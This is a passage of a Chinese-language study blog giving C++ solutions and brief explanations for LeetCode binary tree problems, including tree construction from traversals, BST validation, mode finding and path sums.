<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; temp;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; res;</span><br><span class="line">        <span class="built_in">preTraversal</span>(root);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; temp.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            string s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; temp[i].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j != temp[i].<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">                    s += <span class="built_in">to_string</span>(temp[i][j]) + <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    s += <span class="built_in">to_string</span>(temp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        path.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            temp.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">            <span class="built_in">preTraversal</span>(root-&gt;left);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">            <span class="built_in">preTraversal</span>(root-&gt;right);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="404-左叶子之和"><a href="#404-左叶子之和" class="headerlink" title="404. 左叶子之和"></a><a href="https://leetcode.cn/problems/sum-of-left-leaves/">404. 左叶子之和</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011113826.png" alt="image-20241001111336735"></p>
<p>采用先序遍历,判断每个结点的左孩子是否为叶子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">preTraversal</span>(root);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">            <span class="keyword">if</span> (root-&gt;left-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;left-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                sum += root-&gt;left-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">preTraversal</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">preTraversal</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="513-找树左下角的值"><a href="#513-找树左下角的值" class="headerlink" title="513. 找树左下角的值"></a><a href="https://leetcode.cn/problems/find-bottom-left-tree-value/">513. 找树左下角的值</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011113622.png" alt="image-20241001111345526"></p>
<p>本题的最直观的想法肯定是用层序遍历,记录每一层最先出队的元素就是最左下角的值</p>
<p>但是可以采用先序遍历+回溯的方法来找该二叉树的 <strong>最底层 最左边</strong> 节点的值。</p>
<ol>
<li>遍历顺序是先序,所以左孩子一定比右孩子先访问</li>
<li>定义一个depth变量记录当前节点的深度,如果它比最大深度大了,则说明它是当前遍历了的结点中<strong>最底层 最左边</strong>的值,更深的一层只有第一个被访问的结点才会引起res的更新,所以res一定会在遍历结束后被更新为最深层最左侧的值</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> maxDepth = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">preTraversal</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        depth++;</span><br><span class="line">        <span class="keyword">if</span> (depth &gt; maxDepth) &#123;</span><br><span class="line">            maxDepth = depth;</span><br><span class="line">            res = root-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">            <span class="built_in">preTraversal</span>(root-&gt;left);</span><br><span class="line">            depth--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">            <span class="built_in">preTraversal</span>(root-&gt;right);</span><br><span class="line">            depth--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="112-路径总和"><a href="#112-路径总和" class="headerlink" title="112. 路径总和"></a><a href="https://leetcode.cn/problems/path-sum/">112. 路径总和</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011114313.png" alt="image-20241001111431193"></p>
<p>访问叶子结点之前就把它的值加上,从叶子结点返回后把它的值减去</p>
<p>收获结果是在叶子结点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> res = <span class="literal">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* root, <span class="keyword">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += root-&gt;val;</span><br><span class="line">        <span class="built_in">preTraversal</span>(root, targetSum);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preTraversal</span><span class="params">(TreeNode* root, <span class="keyword">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sum == targetSum) &#123;</span><br><span class="line">                res = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;<span class="comment">//这两个return加了的话就少走一次下面的语句</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">            sum += root-&gt;left-&gt;val;</span><br><span class="line">            <span class="built_in">preTraversal</span>(root-&gt;left, targetSum);</span><br><span class="line">            sum -= root-&gt;left-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">            sum += root-&gt;right-&gt;val;</span><br><span class="line">            <span class="built_in">preTraversal</span>(root-&gt;right, targetSum);</span><br><span class="line">            sum -= root-&gt;right-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="二叉树的构造"><a href="#二叉树的构造" class="headerlink" title="二叉树的构造"></a>二叉树的构造</h3><h4 id="105-从前序与中序遍历序列构造二叉树"><a href="#105-从前序与中序遍历序列构造二叉树" class="headerlink" title="105. 从前序与中序遍历序列构造二叉树"></a><a href="https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal/">105. 从前序与中序遍历序列构造二叉树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011114306.png" alt="image-20241001111439185"></p>
<p>每次都找到根结点建立根结点并递归的向下构造二叉树,最后逐层向上返回构造好的结点</p>
<p>关键步骤:</p>
<ol>
<li>根据先序找到当前子树部分的头结点并在中序中找到对应的下标<code>rootIndex</code>用于计算左右子树结点个数递归调用时划分左右区间</li>
<li>采用左闭右开区间更方便划分区间</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; preorder, vector&lt;<span class="keyword">int</span>&gt;&amp; inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(preorder, inorder, <span class="number">0</span>, preorder.<span class="built_in">size</span>(), <span class="number">0</span>, inorder.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">helper</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; preorder, vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, <span class="keyword">int</span> pLeft,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">int</span> pRight, <span class="keyword">int</span> Ileft, <span class="keyword">int</span> Iright)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pLeft == pRight) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> rootVal = preorder[pLeft];</span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line">        <span class="comment">// 先根据根结点的值找到根结点在中序序列中的位置</span></span><br><span class="line">        <span class="keyword">int</span> rootIndex = Ileft;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Iright; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (inorder[i] == rootVal) &#123;</span><br><span class="line">                rootIndex = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> leftNum = rootIndex - Ileft;</span><br><span class="line">        <span class="keyword">int</span> rightNum = Iright - rootIndex;</span><br><span class="line">        root-&gt;left = <span class="built_in">helper</span>(preorder, inorder, pLeft + <span class="number">1</span>, pLeft + <span class="number">1</span> + leftNum,</span><br><span class="line">                            Ileft, rootIndex);</span><br><span class="line">        root-&gt;right = <span class="built_in">helper</span>(preorder, inorder, pLeft + <span class="number">1</span> + leftNum, pRight,</span><br><span class="line">                             rootIndex + <span class="number">1</span>, Iright);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="106-从中序与后序遍历序列构造二叉树"><a href="#106-从中序与后序遍历序列构造二叉树" class="headerlink" title="106. 从中序与后序遍历序列构造二叉树"></a><a href="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/">106. 从中序与后序遍历序列构造二叉树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011114024.png" alt="image-20241001111449908"></p>
<p>这道题大体思路和上题没啥区别,都是递归建立结点最后返回</p>
<p>这种题目难点在于对左右子树的遍历序列的划分,划分的时候要仔细一点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, vector&lt;<span class="keyword">int</span>&gt;&amp; postorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(inorder, postorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>(), <span class="number">0</span>,</span><br><span class="line">                      postorder.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">helper</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, vector&lt;<span class="keyword">int</span>&gt;&amp; postorder, <span class="keyword">int</span> iLeft,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">int</span> iRight, <span class="keyword">int</span> pLeft, <span class="keyword">int</span> pRight)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iLeft == iRight) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> rootVal = postorder[pRight - <span class="number">1</span>];</span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line">        <span class="keyword">int</span> rootIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = iLeft; i &lt; iRight; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (inorder[i] == rootVal) &#123;</span><br><span class="line">                rootIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> leftNum = rootIndex - iLeft;</span><br><span class="line">        <span class="keyword">int</span> rightNum = iRight - rootIndex;</span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">helper</span>(inorder, postorder, iLeft, rootIndex,</span><br><span class="line">                            pRight - rightNum - leftNum, pRight - rightNum);</span><br><span class="line">        root-&gt;right = <span class="built_in">helper</span>(inorder, postorder, rootIndex + <span class="number">1</span>, iRight,</span><br><span class="line">                             pRight - rightNum, pRight - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="654-最大二叉树"><a href="#654-最大二叉树" class="headerlink" title="654. 最大二叉树"></a><a href="https://leetcode.cn/problems/maximum-binary-tree/">654. 最大二叉树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011115199.png" alt="image-20241001111504082"></p>
<p>思路和上面两题没啥区别,都是找到一个能划分左右子树的结点,然后递归构造即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">constructMaximumBinaryTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(nums, <span class="number">0</span>, nums.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">helper</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left == right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> maxNum = INT_MIN;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = left; i &lt; right; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; maxNum) &#123;</span><br><span class="line">                maxIndex = i;</span><br><span class="line">                maxNum = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(maxNum);</span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">helper</span>(nums, left, maxIndex);</span><br><span class="line">        root-&gt;right = <span class="built_in">helper</span>(nums, maxIndex + <span class="number">1</span>, right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="617-合并二叉树"><a href="#617-合并二叉树" class="headerlink" title="617. 合并二叉树"></a><a href="https://leetcode.cn/problems/merge-two-binary-trees/">617. 合并二叉树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011115369.png" alt="image-20241001111514231"></p>
<p>将两棵树合并到root1上去,采用先序遍历</p>
<p>递归出口就是两个子树有一个为空的情况,只要两个都不为空则继续向下递归,每到两个非空结点,合并他俩的值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">mergeTrees</span><span class="params">(TreeNode* root1, TreeNode* root2)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 同时遍历两棵二叉树</span></span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root2 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        root1-&gt;val += root2-&gt;val;</span><br><span class="line"></span><br><span class="line">        root1-&gt;left = <span class="built_in">mergeTrees</span>(root1-&gt;left, root2-&gt;left);</span><br><span class="line">        root1-&gt;right = <span class="built_in">mergeTrees</span>(root1-&gt;right, root2-&gt;right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><h4 id="700-二叉搜索树中的搜索"><a href="#700-二叉搜索树中的搜索" class="headerlink" title="700. 二叉搜索树中的搜索"></a><a href="https://leetcode.cn/problems/search-in-a-binary-search-tree/">700. 二叉搜索树中的搜索</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011115777.png" alt="image-20241001111525663"></p>
<p>很简单的一道题,找到之后别忘记break</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">searchBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        TreeNode* res = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (root) &#123;</span><br><span class="line">            <span class="keyword">if</span> (val &gt; root-&gt;val) &#123;</span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (val &lt; root-&gt;val) &#123;</span><br><span class="line">                root = root-&gt;left;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res = root;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a href="https://leetcode.cn/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></h4><p>二叉搜索树是中序遍历递增的,使用一个pre指针指向中序遍历的前一个结点,每次检查cur-&gt;val是否大于pre-&gt;val,避免得到中序序列之后再去遍历中序序列检查是否有序</p>
<p>遍历顺序指的是对结点的处理顺序</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* pre = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">bool</span> res = <span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorderTraversal</span><span class="params">(TreeNode* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(cur-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (pre == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur-&gt;val &lt;= pre-&gt;val) &#123;</span><br><span class="line">                res = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pre=cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(cur-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="530-二叉搜索树的最小绝对差"><a href="#530-二叉搜索树的最小绝对差" class="headerlink" title="530. 二叉搜索树的最小绝对差"></a><a href="https://leetcode.cn/problems/minimum-absolute-difference-in-bst/">530. 二叉搜索树的最小绝对差</a></h4><p>最小绝对值之差肯定在中序遍历的相邻元素产生,和上题一样,用pre指针解决</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> res = INT_MAX;</span><br><span class="line">    TreeNode* pre = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorderTraversal</span><span class="params">(TreeNode* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(cur-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (pre == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res = <span class="built_in">min</span>(res, cur-&gt;val - pre-&gt;val);</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(cur-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="501-二叉搜索树中的众数"><a href="#501-二叉搜索树中的众数" class="headerlink" title="501. 二叉搜索树中的众数"></a><a href="https://leetcode.cn/problems/find-mode-in-binary-search-tree/">501. 二叉搜索树中的众数</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011116792.png" alt="image-20241001111637671"></p>
<p>这题最笨的方法就是维护一个map记录每个元素出现次数,最后遍历map找到众数</p>
<p>但是这题是二叉搜索树,它相同的元素一定是在中序中相邻的,所以可以维护<code>count</code>和<code>maxCount</code>两个变量,maxCount初始值为1,用双指针,发现pre跟cur的val一样的时候,count++,当count&gt;maxCount的时候清空res添加当前众数进去并更新maxCount,当count==maxCount的时候直接加入res中</p>
<p>当pre和cur不相等的时候如果此时<code>maxCount==1</code>,则直接加入res中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* pre = <span class="literal">NULL</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> maxCount = <span class="number">1</span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">findMode</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorderTraversal</span><span class="params">(TreeNode* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">inorderTraversal</span>(cur-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (pre == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (pre-&gt;val == cur-&gt;val) &#123;</span><br><span class="line">                count++;</span><br><span class="line">                <span class="keyword">if</span> (count == maxCount) &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count &gt; maxCount) &#123;</span><br><span class="line">                    maxCount = count;</span><br><span class="line">                    res.<span class="built_in">clear</span>();</span><br><span class="line">                    res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                count = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (maxCount == <span class="number">1</span>) &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">inorderTraversal</span>(cur-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236. 二叉树的最近公共祖先"></a><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011117783.png" alt="image-20241001111732645"></p>
<p>很有意思的一道题目,后序遍历,只有找到对应和p或者q才返回值,其他返回NULL</p>
<p>两个值在两个子树上面的代码包含了他俩在一条路径上的情况</p>
